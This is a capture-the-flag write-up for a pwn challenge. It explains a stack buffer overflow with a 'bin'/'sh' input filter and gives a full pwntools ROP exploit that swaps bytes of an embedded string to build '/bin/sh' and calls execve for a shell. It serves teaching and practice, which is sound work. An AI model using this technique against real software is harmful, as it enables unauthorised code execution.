+++
date = '2026-03-03'
title = 'Masterchef'
tags = ['pwn', 'medium']
+++

Category: Pwn

Difficulty: Medium (478 points)

Author: Théo Davreux

## Description

Here's a pwn challenge. We'll let you cook.

## Challenge files

[masterchef](masterchef)

## Observations

In the main function we can immediately see there is a buffer overflow at `memcpy(local_48, local_1d8, 400)` since up
to 400 bytes are read into `local_1d8` from stdin, but the size of `local_48` is only 56 bytes.

```c
undefined8 main(void) {
  char *pcVar1;
  char local_1d8 [400];
  undefined1 local_48 [56];
  int *local_10;
  
  ...

  puts("Are you the masterchef that can cheese this binary? Please tell me your recipe!\n");
  pcVar1 = fgets(local_1d8,400,stdin);
  
  ...

  pcVar1 = strstr(local_1d8,"bin");
  if (pcVar1 == (char *)0x0) {
    pcVar1 = strstr(local_1d8,"sh");
    if (pcVar1 == (char *)0x0) {
      memcpy(local_48,local_1d8,400);
      puts("Hmmm... I\'ve tasted better before. Better luck next time!\n");
      return 0;
    }
  }
  puts("Forbidden ingredient detected! Exiting...\n");
  exit(1);
}
```
The function does check if "bin" or "sh" is in the input, so we will have to inject this in another way.

There are also small ingredient based functions that we can use to manipulate argument registers, 
for example `add_basilicum` allows us to set the `RAX` register from the stack, moreover `ENDBR64` allows us to jump to it
using an indirect jump, like `RET`.
```assembly
                     undefined add_basilicum()
00401264 f3 0f 1e fa       ENDBR64
00401268 58                POP          RAX
00401269 c3                RET
```

There are similar gadgets for the other registers: `add_cheese` for `RSI`, `add_flour` for `RDX` and `add_tomatoes` for `RDI`.

We also have a function `call_for_moms_help` which allows us to execute a syscall.
```assembly
                     undefined call_for_moms_help()
00401236 f3 0f 1e fa       ENDBR64
0040123a 0f 05             SYSCALL
0040123c 48 c7 c0 00       MOV          RAX,0x0
00401243 48 8b 00          MOV          RAX,qword ptr [RAX]
00401246 90                NOP
00401247 0f 0b             UD2
```

Lastly there is a function that allows us to swap 2 bytes using an XOR swap called `use_mixer`.
```assembly
                     undefined use_mixer()
0040126d f3 0f 1e fa       ENDBR64
00401271 67 8a 06          MOV          AL,byte ptr [ESI]
00401274 67 86 07          XCHG         byte ptr [EDI],AL
00401277 67 88 06          MOV          byte ptr [ESI],AL
0040127a c3                RET
```

## Solution

This challenge requires us to execute a ROP attack, so we will edit the stack so the `RET` instruction at the end of main
will jump to the gadgets we want. We can use `call_for_moms_help` to call the `execve` syscall, and the other gadgets to 
set the parameters. 

Now all we need is to set the payload to something like `/bin/sh`, but the program blocks this. Fortunately after calling
`strings masterchef` we see the string `/ashbins/`, which we can shift to our target payload using the `use_mixer` gadget.

## Solution script

```py
from pwn import *

elf = ELF('masterchef')

syscall_addr = elf.symbols['call_for_moms_help']
pop_rdi = elf.symbols['add_tomatoes']
pop_rsi = elf.symbols['add_cheese']
pop_rdx = elf.symbols['add_flour']
pop_rax = elf.symbols['add_basilicum']
bytes_swapper = elf.symbols['use_mixer']

p = process('./masterchef')

binsh = next(elf.search(b'/ashbins/'))
offset = 56 + 8 + 8

rop = b''

def swap_bytes(addr1, addr2):
    global rop
    rop += p64(pop_rsi) + p64(addr1)
    rop += p64(pop_rdi) + p64(addr2)
    rop += p64(bytes_swapper)

# Swap bytes to create /bin/sh
swap_bytes(binsh + 1, binsh + 4) # /bshains/\0
swap_bytes(binsh + 2, binsh + 5) # /bihasns/\0
swap_bytes(binsh + 3, binsh + 6) # /binashs/\0
swap_bytes(binsh + 4, binsh + 8) # /bin/shsa\0
swap_bytes(binsh + 7, binsh + 9) # /bin/sh\0as

# Execute syscall
rop += p64(pop_rdi) + p64(binsh)
rop += p64(pop_rsi) + p64(0x0)
rop += p64(pop_rdx) + p64(0x0)
rop += p64(pop_rax) + p64(59) # execve syscall
rop += p64(syscall_addr)

payload = flat({
    offset: rop
})

p.sendlineafter(b'Are you the masterchef that can cheese this binary? Please tell me your recipe!', payload)
p.interactive()
```
